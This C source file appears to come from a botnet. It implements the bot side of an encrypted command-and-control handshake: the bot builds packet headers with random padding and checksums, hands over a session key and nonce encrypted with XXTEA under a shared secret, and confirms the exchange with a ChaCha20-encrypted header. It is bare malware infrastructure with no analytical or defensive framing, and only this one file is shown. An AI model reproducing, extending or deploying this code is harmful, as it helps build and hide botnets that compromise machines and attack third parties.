#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "xxtea.h"
#include "rand.h"
#include "checksum.h"
#include "csum.h"
#include "bot.h"
#include "chacha20.h"

int csum_create(csum_t *hdr, uint8_t op, uint16_t len) {
	hdr->op = op;

	if (len)
		hdr->len = htons(len);

	int padding_len = rand_next_range(MIN_PADDING_SIZE, MAX_PADDING_SIZE);

	/* random padding size */
	hdr->padding_len = htons(padding_len);

	rand_str(hdr->padding, padding_len);

	/* we actually need to htons this lol */
	hdr->csum = checksum_generic(hdr, sizeof(csum_t));

	return HDR_PKT_LEN + padding_len;
}

void csum_handover_key(bot_t *bot) {

	size_t out_len;
	char *key = xxtea_encrypt(bot->key, KEY_SIZE, secret_key, &out_len);

	if (!key)
		return;

	send(bot->fd, key, out_len, MSG_NOSIGNAL);

	free(key);
}

void csum_handover_nonce(bot_t *bot) {

	size_t out_len;
	char *nonce = xxtea_encrypt(bot->nonce, NONCE_SIZE, secret_key, &out_len);

	if (!nonce)
		return;

	send(bot->fd, nonce, out_len, MSG_NOSIGNAL);

	free(nonce);
}

void csum_confirm_exchange(bot_t *bot) {
	csum_t hdr = {0};

	int hdr_len = csum_create(&hdr, CONFIRM_EXCHANGE, 0);

	chacha20_xor(bot->key, 1, bot->nonce, (uint8_t *)&hdr, (uint8_t *)&hdr, hdr_len);
	send(bot->fd, &hdr, hdr_len, MSG_NOSIGNAL);
}

BOOL csum_verify(csum_t *hdr, uint16_t csum) {
	hdr->csum = 0;

	return (checksum_generic(hdr, sizeof(csum_t)) == csum);
}
